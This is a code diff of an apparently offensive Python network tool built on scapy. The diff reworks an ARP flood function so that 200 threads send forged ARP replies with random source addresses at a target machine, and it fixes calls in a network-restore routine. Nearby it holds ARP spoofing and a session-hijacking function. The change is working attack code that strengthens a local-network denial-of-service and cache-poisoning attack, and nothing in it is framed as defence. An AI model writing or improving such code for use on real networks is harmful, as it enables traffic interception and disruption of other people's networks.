@@ -4,6 +4,10 @@ import sys
 import os
 import scapy.all as scapy
 from scapy.layers.http import HTTPRequest
+import threading
+
+total_packets_sent = 0
+lock = threading.Lock()
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -27,25 +31,46 @@ def arp_spoof(target_ip, spoof_ip):
 def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     print ("\n[*] Restoring Targets...")
 
-    send(ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
-    send(ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
+    scapy.send(scapy.ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7)
+    scapy.send(scapy.ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7)
     disable_ip_forwarding()
     print ("[*] Shutting Down...")
     sys.exit(1)
 
-def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac):
-    sent_packets_count = 0
+def send_arp_requests(target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
+    global total_packets_sent
+    try:
+        while not stop_event.is_set():
+            with lock:
+                total_packets_sent += 1
+                print(f"[+] Packets sent: {total_packets_sent}", end="\r")
+                sys.stdout.flush()
+            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=scapy.RandIP()), verbose=False)
+    except KeyboardInterrupt:
+        stop_event.set()
+        print("\nStopping ARP flood attack and restoring network...")
+        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+        sys.exit(0)
+
+def arp_flood(target_ip, target_mac, gateway_ip, gateway_mac, thread_count=200):
+    stop_event = threading.Event()
+    threads = []
+
+    for _ in range(thread_count):
+        thread = threading.Thread(target=send_arp_requests, args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event))
+        thread.start()
+        threads.append(thread)
+
     try:
         while True:
-            for _ in range(100):
-                sent_packets_count += 1
-                print("[+] Packets sent: " + str(sent_packets_count), end="\r")
-                sys.stdout.flush()
-                scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=scapy.RandIP()), verbose=False)
-            print("[+] Flooding ARP requests...")
-            time.sleep(2)
+            time.sleep(1)
     except KeyboardInterrupt:
-        print("\nStopping ARP flood attack and restoring network...")
+        print("\nStopping ARP flood attack.")
+        stop_event.set()
+        for thread in threads:
+            thread.join()
+        print("\nRestoring network...")
+        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit(0)
 
 def session_hijacking(interface):
